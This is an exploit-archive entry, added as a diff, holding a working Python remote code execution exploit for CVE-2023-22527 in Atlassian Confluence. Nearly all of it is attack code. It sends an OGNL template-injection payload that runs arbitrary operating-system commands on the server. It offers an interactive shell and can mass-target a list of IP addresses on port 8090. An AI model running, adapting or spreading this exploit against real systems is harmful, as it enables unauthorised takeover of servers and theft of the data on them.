@@ -1,0 +1,88 @@
+id: 39469
+date: 03/18/2024
+title: Atlassian Confluence < 8.5.3 - Remote Code Execution Exploit
+author: MaanVader
+cves: CVE-2023-22527
+
+# Exploit Title: CVE-2023-22527: Atlassian Confluence RCE Vulnerability
+# Exploit Author: MaanVader
+# Vendor Homepage: https://www.atlassian.com/software/confluence
+# Software Link: https://www.atlassian.com/software/confluence
+# Version:  8.0.x, 8.1.x, 8.2.x, 8.3.x, 8.4.x, 8.5.0-8.5.3
+# Tested on: 8.5.3
+# CVE : CVE-2023-22527
+
+
+
+import requests
+import argparse
+import urllib3
+from prompt_toolkit import PromptSession
+from prompt_toolkit.formatted_text import HTML
+from rich.console import Console
+
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Argument parsing
+parser = argparse.ArgumentParser(description="Send a payload to Confluence servers.")
+parser.add_argument("-u", "--url", help="Single Confluence Server URL")
+parser.add_argument("-f", "--file", help="File containing list of IP addresses")
+parser.add_argument("-c", "--command", help="Command to Execute")
+parser.add_argument("--shell", action="store_true", help="Open an interactive shell on the specified URL")
+args = parser.parse_args()
+
+# Rich console for formatted output
+console = Console()
+
+# Function to send payload
+def send_payload(url, command):
+    headers = {
+        'Connection': 'close',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    payload = ('label=\\u0027%2b#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027'
+                      '&x=@org.apache.struts2.ServletActionContext@getResponse().getWriter().write((new freemarker.template.utility.Execute()).exec({"' + command + '"}))\r\n')
+    headers['Content-Length'] = str(len(payload))
+    
+    full_url = f"{url}/template/aui/text-inline.vm"
+    response = requests.post(full_url, verify=False, headers=headers, data=payload, timeout=10, allow_redirects=False)
+    return response.text.split('<!DOCTYPE html>')[0].strip()
+
+# Interactive shell function
+def interactive_shell(url):
+    session = PromptSession()
+    console.print("[bold yellow][!] Shell is ready, please type your commands UwU[/bold yellow]")
+    while True:
+        try:
+            cmd = session.prompt(HTML("<ansired><b>$ </b></ansired>"))
+            if cmd.lower() in ["exit", "quit"]:
+                break
+            response = send_payload(url, cmd)
+            console.print(response)
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            console.print(f"[bold red]Error: {e}[/bold red]")
+            break
+
+# Process file function
+def process_file(file_path):
+    with open(file_path, 'r') as file:
+        for line in file:
+            ip = line.strip()
+            url = f"http://{ip}:8090"
+            console.print(f"Processing {url}")
+            print(send_payload(url, args.command))
+
+# Main execution logic
+if args.shell and args.url:
+    interactive_shell(args.url)
+elif args.url and args.command:
+    print(send_payload(args.url, args.command))
+elif args.file and args.command:
+    process_file(args.file)
+else:
+    print("Error: Please provide a valid URL and a command or use the interactive shell option.")
+
+#  0day.today [2024-03-20]  #
